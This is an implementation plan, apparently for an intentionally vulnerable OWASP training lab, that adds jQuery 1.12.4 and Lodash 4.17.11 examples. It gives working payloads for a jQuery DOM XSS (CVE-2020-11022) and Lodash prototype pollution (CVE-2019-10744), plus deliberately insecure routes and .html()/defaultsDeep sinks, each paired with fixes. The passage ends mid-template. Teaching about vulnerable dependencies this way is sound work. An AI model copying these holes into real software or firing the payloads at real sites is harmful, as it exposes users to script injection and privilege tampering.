# A06 Vulnerable and Outdated Components Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build A06 (OWASP Top 10 2021: Vulnerable and Outdated Components) as a
new category with six examples, two per difficulty tier, covering two real,
historical, publicly-documented CVEs in vendored client-side JavaScript
libraries.

**Architecture:** New Flask blueprint `app/categories/a06_vulnerable_components/`
registered in `app/__init__.py`, following the exact A01–A05 scaffold (blueprint
+ `CategoryNav`/`ExampleNav` registration + `overview.html` + one template per
example extending `core/example_page_base.html`). No new database models or
seed function — every example's exploitable state lives entirely in
browser-side JavaScript for the life of one page view. Two real, old,
historically-vulnerable JS libraries are vendored as new, isolated static
fixtures and loaded only by the specific example templates that need them.

**Tech Stack:** Flask 3.0.3, Jinja2 templates, vanilla JavaScript, jQuery
1.12.4 (vulnerable fixture), Lodash 4.17.11 (vulnerable fixture), pytest.

**Spec:** `docs/superpowers/specs/2026-09-21-owasp-lab-a06-vulnerable-components-design.md`

## Global Constraints

- Vendored files must be the real, unmodified, byte-for-byte official
  releases, fetched via `curl -sL -o <path> <url>` from their real
  distribution points — never hand-written or approximated:
  - jQuery: `https://code.jquery.com/jquery-1.12.4.js` →
    `static/vendor/jquery-vulnerable/jquery-1.12.4.js`
  - Lodash: `https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.11/lodash.js` →
    `static/vendor/lodash-vulnerable/lodash-4.17.11.js`
- Every payload shown in this plan was live-verified character-for-character
  during brainstorming (positive control against the vulnerable version,
  negative control against the patched version). Transcribe them exactly —
  do not paraphrase or "improve" them.
- Vendored fixtures are additive and isolated: loaded only via
  `<script src="{{ url_for('static', filename='vendor/...') }}">` inside the
  specific example templates that need them. Never add a script tag to
  `app/core/templates/core/base.html` or any other shared template.
- `requirements.txt` is untouched by this plan — every vulnerable component
  in this category is client-side JavaScript, not a Python package.
- No new database models, no `seed_fn` — nothing in this category persists
  state server-side.
- Any literal `<`, `>`, or `&` shown as static Jinja block text (not inside
  `{{ }}`) must be HTML-entity-escaped in the template source (`&lt;`,
  `&gt;`, `&amp;`) — Jinja does not autoescape block content, only `{{ }}`
  expressions. Pure-JS payloads with no `<`/`>`/`&` characters need no
  escaping.
- Each example template sets `{% set code_language = "..." %}` matching its
  actual vulnerable/secure code content (`"javascript"` for pure-JS blocks,
  `"html"` for blocks mixing markup and `<script>` tags); omit it only when
  the block is genuine Python (defaults to `"python"`).
- pytest cannot execute browser JavaScript, so no automated test can prove
  an exploit payload actually fires. Tests for the four exploit-bearing
  examples (3, 4, 5, 6) verify only the server-side surface: the exact
  vulnerable vendored file (not a patched one) is what the page references,
  and that exact file on disk is genuinely the CVE-bearing release (checked
  via its own header/version string). Task 7 adds a controller-performed
  live Docker + browser verification pass to prove the exploits themselves.
- Follow the exact A05 category scaffold: `Blueprint(..., template_folder="templates", url_prefix="/a06")`,
  `CATEGORIES.append(CategoryNav(...))` in `__init__.py`, one `routes.py`,
  templates under `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/`.

---

## Task 1: Category Scaffold + Example 1 (Component Version Disclosure)

**Files:**
- Create: `app/categories/a06_vulnerable_components/__init__.py`
- Create: `app/categories/a06_vulnerable_components/routes.py`
- Create: `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/overview.html`
- Create: `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/component_inventory.html`
- Modify: `app/__init__.py`
- Test: `tests/test_a06_component_inventory.py`

**Interfaces:**
- Produces: Blueprint `a06_bp` (import path `app.categories.a06_vulnerable_components.a06_bp`),
  registered at `url_prefix="/a06"`. Route endpoint
  `a06_vulnerable_components.overview` → `GET /a06/`. Route endpoint
  `a06_vulnerable_components.component_inventory` → `GET /a06/component-inventory`.
  `CategoryNav(id="a06_vulnerable_components", ...)` appended to
  `app.core.nav.CATEGORIES`, with one `ExampleNav(id="version-disclosure", ...)`
  so far. Later tasks import `a06_bp` from
  `app.categories.a06_vulnerable_components` to register more routes, and
  modify the same `CATEGORIES.append(...)` call to add more `ExampleNav`
  entries.

- [ ] **Step 1: Write the failing test**

Create `tests/test_a06_component_inventory.py`:

```python
from importlib.metadata import version


def test_component_inventory_renders(client):
    response = client.get("/a06/component-inventory")
    assert response.status_code == 200
    body = response.data.decode()
    assert "jQuery (Legacy Widgets bundle)" in body
    assert "1.12.4" in body
    assert "Lodash (Legacy Widgets bundle)" in body
    assert "4.17.11" in body


def test_component_inventory_shows_the_real_installed_flask_version(client):
    response = client.get("/a06/component-inventory")
    body = response.data.decode()
    assert version("flask") in body
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a06_component_inventory.py -v`
Expected: FAIL — `404 NOT FOUND` (no `/a06/component-inventory` route exists
yet), or a connection/import error if `create_app()` can't find the
blueprint. Either failure mode confirms the feature doesn't exist yet.

- [ ] **Step 3: Create the blueprint package**

Create `app/categories/a06_vulnerable_components/__init__.py`:

```python
from flask import Blueprint

a06_bp = Blueprint(
    "a06_vulnerable_components", __name__, template_folder="templates", url_prefix="/a06"
)

from app.categories.a06_vulnerable_components import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a06_vulnerable_components",
        short_id="A06",
        title="Vulnerable and Outdated Components",
        blurb="Outdated, unpatched dependencies with known public CVEs still running in production.",
        blueprint_name="a06_vulnerable_components",
        overview_endpoint="a06_vulnerable_components.overview",
        examples=[
            ExampleNav(
                id="version-disclosure",
                title="Component Version Disclosure",
                group="Component Reconnaissance",
                difficulty="Easy",
                endpoint="a06_vulnerable_components.component_inventory",
            ),
        ],
    )
)
```

- [ ] **Step 4: Create the routes module**

Create `app/categories/a06_vulnerable_components/routes.py`:

```python
from importlib.metadata import version
import platform

from flask import render_template

from app.categories.a06_vulnerable_components import a06_bp


@a06_bp.route("/")
def overview():
    return render_template("a06_vulnerable_components/overview.html")


@a06_bp.route("/component-inventory")
def component_inventory():
    # VULNERABLE: a leftover internal "component inventory" page, meant for
    # an ops dashboard, reachable by anyone with no authentication at all --
    # it hands an attacker exactly what they need before searching a CVE
    # database for each exact version.
    component_versions = {
        "Flask": version("flask"),
        "jQuery (Legacy Widgets bundle)": "1.12.4",
        "Lodash (Legacy Widgets bundle)": "4.17.11",
        "Python": platform.python_version(),
    }
    return render_template(
        "a06_vulnerable_components/component_inventory.html",
        component_versions=component_versions,
    )
```

- [ ] **Step 5: Create the overview template**

Create `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/overview.html`:

```html
{% extends "core/overview_base.html" %}
{% set category_short_id = "A06" %}
{% set category_title = "Vulnerable and Outdated Components" %}
{% block title %}A06: Vulnerable and Outdated Components{% endblock %}

{% block what_it_is %}
<p>
  Vulnerable and Outdated Components covers using a library, framework, or
  other software module with a known public vulnerability, or one that's
  unsupported and no longer receives security patches. The vulnerability
  isn't in the application's own code at all — it's in something the
  application trusted and never upgraded.
</p>
{% endblock %}

{% block why_it_matters %}
<p>
  Modern applications are built on dozens or hundreds of third-party
  dependencies. A single outdated one — often several layers deep, easy to
  forget about — can undo every security decision the application's own
  code got right, and the fix (upgrading) is usually a version bump, not a
  redesign.
</p>
{% endblock %}

{% block how_exploited %}
<p>
  Attackers don't need to find a new bug — the bug is already public,
  documented in a CVE record with a working proof of concept. They just
  need to fingerprint which exact component versions a target is running
  (often trivial: a version string in a response, a file comment, a
  response header) and match them against a vulnerability database.
</p>
{% endblock %}

{% block attack_flow_diagram %}
sequenceDiagram
    participant Attacker
    participant App as Vulnerable App
    Attacker->>App: Fingerprint exact component versions in use
    Note over App: A dependency was never upgraded past a version with a public, documented CVE
    Attacker->>App: Apply the CVE's published exploit technique against that component
    App-->>Attacker: The library's own flaw does the rest -- no new bug needed
{% endblock %}

{% block real_world_impact %}
<p>
  Real incidents in this category include the 2017 Equifax breach (an
  unpatched Apache Struts component with a public CVE), widespread
  compromises following the Log4Shell disclosure in unpatched Log4j
  deployments, and countless smaller breaches via outdated jQuery, Lodash,
  and similar client-side libraries silently vendored years earlier and
  never revisited.
</p>
{% endblock %}

{% block vulnerable_code %}# pinned once, years ago, never revisited
jquery==1.12.4   # released 2016; CVE-2020-11022 fixed in 3.5.0 (2020) -- never upgraded
lodash==4.17.11  # CVE-2019-10744 fixed in 4.17.12 -- one patch version away, never applied
{% endblock %}

{% block secure_code %}# dependencies pinned to current, patched releases, with a recurring
# audit (e.g. npm audit, pip-audit, Dependabot) catching new CVEs
# against whatever's currently pinned
jquery==3.7.1
lodash==4.17.21
{% endblock %}
```

- [ ] **Step 6: Create the component-inventory example template**

Create `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/component_inventory.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Component Version Disclosure" %}
{% set example_difficulty = "Easy" %}
{% block title %}{{ example_title }} — A06{% endblock %}

{% block explanation %}
<p>
  This "Component Inventory" page was built for an internal ops dashboard,
  meant to help the infrastructure team quickly see what's deployed. It was
  never moved behind authentication, so it's reachable by anyone — handing
  out the exact version of every major dependency this app runs, with zero
  effort required to discover it.
</p>
{% endblock %}

{% block detect %}
<p>
  No login, no special request — just visit
  <code>/a06/component-inventory</code> and read the table. Compare that
  to how much work fingerprinting usually takes: guessing framework
  versions from subtle response differences, timing attacks, error-message
  fingerprints. Here, the app just tells you.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Visit <a href="/a06/component-inventory">/a06/component-inventory</a>.</li>
  <li>Note the exact version listed for each component — in particular
      "jQuery (Legacy Widgets bundle)" and "Lodash (Legacy Widgets
      bundle)".</li>
  <li>Look each one up against a public vulnerability database (e.g. the
      <a href="https://github.com/advisories" target="_blank" rel="noopener">GitHub Advisory
      Database</a> or the <a href="https://nvd.nist.gov/" target="_blank" rel="noopener">NVD</a>).
      Both of the "Legacy Widgets bundle" versions here have public, named
      CVEs with documented exploitation techniques — see the other
      examples in this category for exactly how they're exploited.</li>
</ol>
<p>
  This is the reconnaissance step nearly every real component-based attack
  starts with: an attacker doesn't need to find a new bug when the target
  helpfully tells them which already-public bugs to use.
</p>
{% endblock %}

{% block vulnerable_code %}@app.route("/component-inventory")
def component_inventory():
    component_versions = {
        "Flask": version("flask"),
        "jQuery (Legacy Widgets bundle)": "1.12.4",
        "Lodash (Legacy Widgets bundle)": "4.17.11",
        "Python": platform.python_version(),
    }
    return render_template("component_inventory.html", component_versions=component_versions)
# no authentication check -- this was meant for an internal ops dashboard
# and never moved behind one
{% endblock %}

{% block secure_code %}# Don't expose exact dependency versions to unauthenticated visitors at
# all. If a version-inventory page is genuinely needed for ops, require
# authentication and keep it off the public network entirely:
@app.route("/admin/component-inventory")
@require_admin
def component_inventory():
    ...
{% endblock %}

{% block live_example %}
<p>Your current component inventory:</p>
<table class="table table-sm w-auto">
  <tbody>
    {% for name, ver in component_versions.items() %}
    <tr><th scope="row">{{ name }}</th><td>{{ ver }}</td></tr>
    {% endfor %}
  </tbody>
</table>
{% endblock %}
```

- [ ] **Step 7: Register the blueprint in `app/__init__.py`**

Modify `app/__init__.py` — after the existing A05 registration block:

```python
    from app.categories.a05_security_misconfiguration import a05_bp

    app.register_blueprint(a05_bp)
```

add:

```python

    from app.categories.a06_vulnerable_components import a06_bp

    app.register_blueprint(a06_bp)
```

(before the `@app.route("/healthz")` block).

- [ ] **Step 8: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_a06_component_inventory.py -v`
Expected: PASS (2 passed)

- [ ] **Step 9: Commit**

```bash
git add app/categories/a06_vulnerable_components app/__init__.py tests/test_a06_component_inventory.py
git commit -m "feat(a06): add category scaffold and component-inventory example"
```

---

## Task 2: Example 2 (Outdated Vulnerable JS Library Detection) — vendors jQuery 1.12.4

**Files:**
- Create: `static/vendor/jquery-vulnerable/jquery-1.12.4.js`
- Modify: `app/categories/a06_vulnerable_components/routes.py`
- Modify: `app/categories/a06_vulnerable_components/__init__.py`
- Create: `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/legacy_widgets.html`
- Test: `tests/test_a06_legacy_widgets.py`

**Interfaces:**
- Consumes: `a06_bp` from Task 1.
- Produces: Route endpoint `a06_vulnerable_components.legacy_widgets` →
  `GET /a06/legacy-widgets`. Static fixture served at
  `/static/vendor/jquery-vulnerable/jquery-1.12.4.js`, consumed by this
  task's own template and by Tasks 3 and 5.

- [ ] **Step 1: Vendor the real jQuery 1.12.4 file**

```bash
mkdir -p static/vendor/jquery-vulnerable
curl -sL -o static/vendor/jquery-vulnerable/jquery-1.12.4.js https://code.jquery.com/jquery-1.12.4.js
```

Verify it downloaded correctly and is genuinely the vulnerable release:

```bash
head -c 200 static/vendor/jquery-vulnerable/jquery-1.12.4.js
```

Expected: the output starts with a comment block containing the exact line
`jQuery JavaScript Library v1.12.4`. If it doesn't, the download failed or
was redirected to something else — do not proceed until this exact string
is present in the file.

- [ ] **Step 2: Write the failing test**

Create `tests/test_a06_legacy_widgets.py`:

```python
import os

from app import BASE_DIR


def test_legacy_widgets_page_renders(client):
    response = client.get("/a06/legacy-widgets")
    assert response.status_code == 200
    assert b"jquery-1.12.4.js" in response.data


def test_vendored_jquery_is_served_and_is_the_real_vulnerable_version(client):
    response = client.get("/static/vendor/jquery-vulnerable/jquery-1.12.4.js")
    assert response.status_code == 200
    assert b"jQuery JavaScript Library v1.12.4" in response.data


def test_vendored_jquery_file_on_disk_matches_the_vulnerable_release():
    path = os.path.join(BASE_DIR, "static", "vendor", "jquery-vulnerable", "jquery-1.12.4.js")
    with open(path, encoding="utf-8") as f:
        header = f.read(200)
    assert "jQuery JavaScript Library v1.12.4" in header
```

- [ ] **Step 3: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a06_legacy_widgets.py -v`
Expected: `test_legacy_widgets_page_renders` FAILs with 404 (no route yet).
The other two tests may already PASS since the file exists on disk after
Step 1 — that's fine, they're not meant to fail, only to lock in the
correct version now that it's vendored.

- [ ] **Step 4: Add the route**

Modify `app/categories/a06_vulnerable_components/routes.py` — after the
`component_inventory` route, add:

```python


@a06_bp.route("/legacy-widgets")
def legacy_widgets():
    return render_template("a06_vulnerable_components/legacy_widgets.html")
```

- [ ] **Step 5: Add the ExampleNav entry**

Modify `app/categories/a06_vulnerable_components/__init__.py` — in the
`examples=[...]` list, after the `version-disclosure` entry, add:

```python
            ExampleNav(
                id="outdated-jquery-detection",
                title="Outdated Vulnerable JS Library Detection",
                group="Component Reconnaissance",
                difficulty="Easy",
                endpoint="a06_vulnerable_components.legacy_widgets",
            ),
```

- [ ] **Step 6: Create the template**

Create `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/legacy_widgets.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Outdated Vulnerable JS Library Detection" %}
{% set example_difficulty = "Easy" %}
{% set code_language = "html" %}
{% block title %}{{ example_title }} — A06{% endblock %}

{% block explanation %}
<p>
  This site's "Legacy Widgets" bundle — a small set of interactive
  comment-preview and notification-preferences features used elsewhere in
  this category — was built years ago on jQuery and Lodash, and neither
  library has ever been upgraded since. The vendored file is served
  exactly as downloaded from jQuery's own official distribution point,
  with nothing modified.
</p>
{% endblock %}

{% block detect %}
<p>
  Open your browser's developer tools (or just view page source) on this
  page or either of the "Vulnerable Library: jQuery" examples in this
  category, and look at the loaded script's <code>src</code> attribute:
  <code>/static/vendor/jquery-vulnerable/jquery-1.12.4.js</code>. Fetch
  that file directly and read its header comment.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Fetch
      <a href="/static/vendor/jquery-vulnerable/jquery-1.12.4.js" target="_blank" rel="noopener">/static/vendor/jquery-vulnerable/jquery-1.12.4.js</a>
      directly.</li>
  <li>Read the first few lines — jQuery's own header comment states the
      exact version: <code>jQuery JavaScript Library v1.12.4</code>.</li>
  <li>Cross-reference that version against a public vulnerability database.
      jQuery versions <code>&gt;= 1.2</code> and <code>&lt; 3.5.0</code>
      are affected by
      <a href="https://github.com/advisories/GHSA-gxr4-xjj5-5px2" target="_blank" rel="noopener">GHSA-gxr4-xjj5-5px2</a>
      (CVE-2020-11022 / CVE-2020-11023) — a DOM-based XSS in jQuery's own
      HTML-sanitization logic. 1.12.4 is squarely inside that range, more
      than four years and one major security release behind the fix. See
      the "jQuery DOM XSS" example in this category for the real, working
      exploit.</li>
</ol>
{% endblock %}

{% block vulnerable_code %}&lt;script src="/static/vendor/jquery-vulnerable/jquery-1.12.4.js"&gt;&lt;/script&gt;
&lt;!-- vendored once, years ago, never revisited --&gt;
{% endblock %}

{% block secure_code %}&lt;script src="/static/vendor/jquery/jquery-3.7.1.min.js"&gt;&lt;/script&gt;
&lt;!-- pinned to a current release with no known CVEs, re-checked on a
     recurring schedule --&gt;
{% endblock %}

{% block live_example %}
<p>
  Fetch the vendored file directly and confirm its version for yourself:
</p>
<a href="/static/vendor/jquery-vulnerable/jquery-1.12.4.js" class="btn btn-primary" target="_blank" rel="noopener">
  View jquery-1.12.4.js
</a>
{% endblock %}
```

- [ ] **Step 7: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a06_legacy_widgets.py -v`
Expected: PASS (3 passed)

- [ ] **Step 8: Commit**

```bash
git add static/vendor/jquery-vulnerable app/categories/a06_vulnerable_components tests/test_a06_legacy_widgets.py
git commit -m "feat(a06): vendor jQuery 1.12.4 and add legacy-widgets detection example"
```

---

## Task 3: Example 3 (jQuery DOM XSS via Vulnerable `htmlPrefilter`, Medium)

**Files:**
- Modify: `app/categories/a06_vulnerable_components/routes.py`
- Modify: `app/categories/a06_vulnerable_components/__init__.py`
- Create: `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/comment_preview.html`
- Test: `tests/test_a06_jquery_dom_xss.py`

**Interfaces:**
- Consumes: `a06_bp` from Task 1, vendored
  `static/vendor/jquery-vulnerable/jquery-1.12.4.js` from Task 2.
- Produces: Route endpoint `a06_vulnerable_components.comment_preview` →
  `GET /a06/comment-preview`.

- [ ] **Step 1: Write the failing test**

Create `tests/test_a06_jquery_dom_xss.py`:

```python
import os

from app import BASE_DIR


def test_comment_preview_page_renders(client):
    response = client.get("/a06/comment-preview")
    assert response.status_code == 200
    body = response.data.decode()
    assert "comment-preview" in body
    assert "vendor/jquery-vulnerable/jquery-1.12.4.js" in body


def test_comment_preview_wires_up_the_vulnerable_html_call(client):
    response = client.get("/a06/comment-preview")
    body = response.data.decode()
    # The live wiring script must load the vendored 1.12.4 file (not a
    # patched/newer copy) and must call the vulnerable .html() on raw
    # input -- .text() would not be exploitable.
    assert "vendor/jquery-vulnerable/jquery-1.12.4.js" in body
    assert "$('#comment-preview').html(raw)" in body
    assert "jquery-vulnerable/jquery-3" not in body


def test_vendored_jquery_file_is_the_real_vulnerable_release():
    path = os.path.join(BASE_DIR, "static", "vendor", "jquery-vulnerable", "jquery-1.12.4.js")
    with open(path, encoding="utf-8") as f:
        header = f.read(200)
    assert "jQuery JavaScript Library v1.12.4" in header
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a06_jquery_dom_xss.py -v`
Expected: `test_comment_preview_page_renders` and
`test_comment_preview_wires_up_the_vulnerable_html_call` FAIL with 404 (no
route yet). `test_vendored_jquery_file_is_the_real_vulnerable_release`
already PASSes (file vendored in Task 2) — that's expected.

- [ ] **Step 3: Add the route**

Modify `app/categories/a06_vulnerable_components/routes.py` — after the
`legacy_widgets` route, add:

```python


@a06_bp.route("/comment-preview")
def comment_preview():
    return render_template("a06_vulnerable_components/comment_preview.html")
```

- [ ] **Step 4: Add the ExampleNav entry**

Modify `app/categories/a06_vulnerable_components/__init__.py` — in the
`examples=[...]` list, after the `outdated-jquery-detection` entry, add:

```python
            ExampleNav(
                id="jquery-dom-xss",
                title="jQuery DOM XSS via Vulnerable htmlPrefilter",
                group="Vulnerable Library: jQuery HTML Sanitization Bypass",
                difficulty="Medium",
                endpoint="a06_vulnerable_components.comment_preview",
            ),
```

- [ ] **Step 5: Create the template**

Create `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/comment_preview.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "jQuery DOM XSS via Vulnerable htmlPrefilter" %}
{% set example_difficulty = "Medium" %}
{% set code_language = "javascript" %}
{% block title %}{{ example_title }} — A06{% endblock %}

{% block explanation %}
<p>
  This "Comment Preview" widget lets you see how your comment will look
  before posting. The application's own code looks reasonable — it's not
  concatenating raw HTML strings itself, unlike a typical server-side XSS
  bug. Instead, it hands your raw input straight to jQuery's
  <code>.html()</code> method and trusts jQuery's own
  <code>htmlPrefilter</code> to make that safe. On this page, jQuery is
  the vendored, vulnerable 1.12.4 release (see "Outdated Vulnerable JS
  Library Detection" in this category) — and <code>htmlPrefilter</code>'s
  sanitization was itself flawed until version 3.5.0
  (CVE-2020-11022 / CVE-2020-11023).
</p>
{% endblock %}

{% block detect %}
<p>
  Type ordinary text into the box and click Preview — it renders exactly
  as expected, and a quick glance at this page's own code shows no obvious
  server-side escaping bug. The vulnerability only becomes visible once
  you try markup that exploits jQuery's own flawed tag-prefiltering logic.
</p>
{% endblock %}

{% block exploitation %}
<p>
  Paste this exact payload into the comment box and click Preview:
</p>
<pre><code class="language-html">&lt;style&gt;&lt;style /&gt;&lt;img src=1 onerror=alert(document.domain)&gt;</code></pre>
<p>
  A real <code>alert()</code> box fires — genuine script execution, not a
  simulation. Here's what happens: jQuery's <code>htmlPrefilter</code>
  regex "fixes" the self-closing <code>&lt;style /&gt;</code> tag by
  rewriting it to <code>&lt;style&gt;&lt;/style&gt;</code>. That rewrite
  closes the style-text parsing context one tag early, so the browser's
  own HTML parser treats the following <code>&lt;img onerror=...&gt;</code>
  as live markup instead of inert text inside a <code>&lt;style&gt;</code>
  block — and the <code>onerror</code> handler fires the moment the
  (deliberately broken) image fails to load.
</p>
<p>
  This exact mechanism was verified live against the real vendored
  jQuery 1.12.4 file, and confirmed <strong>not</strong> to fire against
  the patched jQuery 3.5.0 — the fix specifically changed how
  <code>htmlPrefilter</code> handles self-closing tags.
</p>
{% endblock %}

{% block vulnerable_code %}$('#preview-btn').on('click', function () {
  var raw = $('#comment-input').val();
  // VULNERABLE: relies on jQuery's own htmlPrefilter to make raw .html()
  // "safe" -- jQuery < 3.5.0's htmlPrefilter regex can be defeated by a
  // self-closing tag, letting injected markup execute (CVE-2020-11022).
  $('#comment-preview').html(raw);
});
{% endblock %}

{% block secure_code %}// Upgrade jQuery past 3.5.0 (the actual fix), AND never trust a library
// to sanitize untrusted HTML on its own -- use a dedicated sanitizer
// (e.g. DOMPurify) or avoid .html() with untrusted input entirely:
$('#preview-btn').on('click', function () {
  var raw = $('#comment-input').val();
  $('#comment-preview').text(raw); // .text() never parses markup at all
});
{% endblock %}

{% block live_example %}
<p>Try it:</p>
<div class="mb-2">
  <textarea id="comment-input" class="form-control" rows="3" placeholder="Type your comment..."></textarea>
</div>
<button type="button" id="preview-btn" class="btn btn-primary mb-2">Preview</button>
<div id="comment-preview" class="border rounded p-2 bg-body-secondary"></div>

<script src="{{ url_for('static', filename='vendor/jquery-vulnerable/jquery-1.12.4.js') }}"></script>
<script>
  $('#preview-btn').on('click', function () {
    var raw = $('#comment-input').val();
    // VULNERABLE: relies on jQuery's own htmlPrefilter to make raw .html()
    // "safe" -- jQuery < 3.5.0's htmlPrefilter regex can be defeated by a
    // self-closing tag, letting injected markup execute (CVE-2020-11022).
    $('#comment-preview').html(raw);
  });
</script>
{% endblock %}
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a06_jquery_dom_xss.py -v`
Expected: PASS (3 passed)

- [ ] **Step 7: Commit**

```bash
git add app/categories/a06_vulnerable_components tests/test_a06_jquery_dom_xss.py
git commit -m "feat(a06): add jQuery DOM XSS example (CVE-2020-11022)"
```

---

## Task 4: Example 4 (Lodash Prototype Pollution via `_.defaultsDeep()`, Medium) — vendors Lodash 4.17.11

**Files:**
- Create: `static/vendor/lodash-vulnerable/lodash-4.17.11.js`
- Modify: `app/categories/a06_vulnerable_components/routes.py`
- Modify: `app/categories/a06_vulnerable_components/__init__.py`
- Create: `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/notification_preferences.html`
- Test: `tests/test_a06_lodash_prototype_pollution.py`

**Interfaces:**
- Consumes: `a06_bp` from Task 1.
- Produces: Route endpoint `a06_vulnerable_components.notification_preferences`
  → `GET /a06/notification-preferences`. Static fixture served at
  `/static/vendor/lodash-vulnerable/lodash-4.17.11.js`, consumed by this
  task's own template and by Task 6.

- [ ] **Step 1: Vendor the real Lodash 4.17.11 file**

```bash
mkdir -p static/vendor/lodash-vulnerable
curl -sL -o static/vendor/lodash-vulnerable/lodash-4.17.11.js https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.11/lodash.js
```

Verify it downloaded correctly:

```bash
head -c 300 static/vendor/lodash-vulnerable/lodash-4.17.11.js
```

Expected: a license-comment header naming Lodash. Confirm the exact version
by running the file's own version constant (the file's UMD wrapper exports
via `module.exports` under plain Node, no browser globals needed):

```bash
node -e "var _ = require('./static/vendor/lodash-vulnerable/lodash-4.17.11.js'); console.log(_.VERSION)" 2>/dev/null || echo "node not available -- verify version via the header comment and the downloaded byte count instead"
```

Expected output: `4.17.11`. If `node` is unavailable, confirm instead by
checking the file's byte size is non-trivial (a real Lodash build is
roughly 500-550KB) and that the license header is present — do not proceed
if the file is empty or is an HTML error page instead of JavaScript.

- [ ] **Step 2: Write the failing test**

Create `tests/test_a06_lodash_prototype_pollution.py`:

```python
import os

from app import BASE_DIR


def test_notification_preferences_page_renders(client):
    response = client.get("/a06/notification-preferences")
    assert response.status_code == 200
    body = response.data.decode()
    assert "prefs-json" in body
    assert "vendor/lodash-vulnerable/lodash-4.17.11.js" in body


def test_notification_preferences_wires_up_the_vulnerable_defaults_deep_call(client):
    response = client.get("/a06/notification-preferences")
    body = response.data.decode()
    assert "vendor/lodash-vulnerable/lodash-4.17.11.js" in body
    assert "_.defaultsDeep({}, DEFAULT_PREFS, userPrefs)" in body
    assert "vendor/lodash-vulnerable/lodash-4.17.12" not in body


def test_vendored_lodash_file_is_present_and_substantial():
    path = os.path.join(BASE_DIR, "static", "vendor", "lodash-vulnerable", "lodash-4.17.11.js")
    assert os.path.getsize(path) > 300_000, "vendored lodash file looks truncated or missing"
    with open(path, encoding="utf-8") as f:
        header = f.read(300)
    assert "lodash" in header.lower()
```

- [ ] **Step 3: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a06_lodash_prototype_pollution.py -v`
Expected: the two page-rendering tests FAIL with 404 (no route yet). The
vendored-file test already PASSes after Step 1 — that's expected.

- [ ] **Step 4: Add the route**

Modify `app/categories/a06_vulnerable_components/routes.py` — after the
`comment_preview` route, add:

```python


@a06_bp.route("/notification-preferences")
def notification_preferences():
    return render_template("a06_vulnerable_components/notification_preferences.html")
```

- [ ] **Step 5: Add the ExampleNav entry**

Modify `app/categories/a06_vulnerable_components/__init__.py` — in the
`examples=[...]` list, after the `jquery-dom-xss` entry, add:

```python
            ExampleNav(
                id="lodash-prototype-pollution",
                title="Lodash Prototype Pollution via _.defaultsDeep()",
                group="Vulnerable Library: Lodash Prototype Pollution",
                difficulty="Medium",
                endpoint="a06_vulnerable_components.notification_preferences",
            ),
```

- [ ] **Step 6: Create the template**

Create `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/notification_preferences.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Lodash Prototype Pollution via _.defaultsDeep()" %}
{% set example_difficulty = "Medium" %}
{% set code_language = "javascript" %}
{% block title %}{{ example_title }} — A06{% endblock %}

{% block explanation %}
<p>
  This "Notification Preferences" feature lets you submit raw JSON to
  customize your settings, merged over sane defaults using Lodash's
  <code>_.defaultsDeep()</code>. This page uses the vendored, vulnerable
  Lodash 4.17.11 release — one patch version behind the fix for
  CVE-2019-10744, a prototype-pollution vulnerability in
  <code>_.merge()</code>, <code>_.mergeWith()</code>, and
  <code>_.defaultsDeep()</code>.
</p>
{% endblock %}

{% block detect %}
<p>
  Submit ordinary preferences JSON like <code>{"theme": "dark"}</code> and
  it merges exactly as expected. The bug isn't visible in the merge result
  itself — it's visible in whether a completely unrelated, freshly-created
  object elsewhere on the page picks up a property it was never given.
</p>
{% endblock %}

{% block exploitation %}
<p>Paste this exact payload into the preferences box and click Apply:</p>
<pre><code class="language-json">{"constructor": {"prototype": {"isAdmin": true}}}</code></pre>
<p>
  Watch the "Fresh object check" panel below flip from <code>undefined</code>
  to <code>true</code>. That object is a brand-new <code>{}</code> literal,
  created fresh, with no reference to anything you submitted — the only way
  it can see <code>isAdmin: true</code> is if <code>Object.prototype</code>
  itself was mutated.
</p>
<p>
  Here's the mechanism: <code>_.defaultsDeep()</code> on Lodash before
  4.17.12 recursively walks every key in your input, including
  <code>"constructor"</code> and <code>"prototype"</code>, and happily
  assigns through them without checking whether it's about to write onto
  <code>Object.prototype</code> instead of a plain data object. Every
  object in the page inherits from <code>Object.prototype</code>, so every
  object — past, present, and future — now has <code>isAdmin: true</code>.
</p>
<p>
  This demo is a single browser tab, so the "blast radius" here is just
  this page. In a real production system, the exact same bug in a Node.js
  backend using this exact Lodash version would pollute the shared server
  process — meaning every concurrent request from every user would see the
  polluted property, not just the attacker's own session. That's what
  makes this class of bug severe in practice.
</p>
{% endblock %}

{% block vulnerable_code %}var DEFAULT_PREFS = { theme: "light", notifications: "digest" };
document.getElementById('apply-btn').addEventListener('click', function () {
  var raw = document.getElementById('prefs-json').value;
  var userPrefs = JSON.parse(raw);
  // VULNERABLE: _.defaultsDeep() on Lodash < 4.17.12 recursively merges
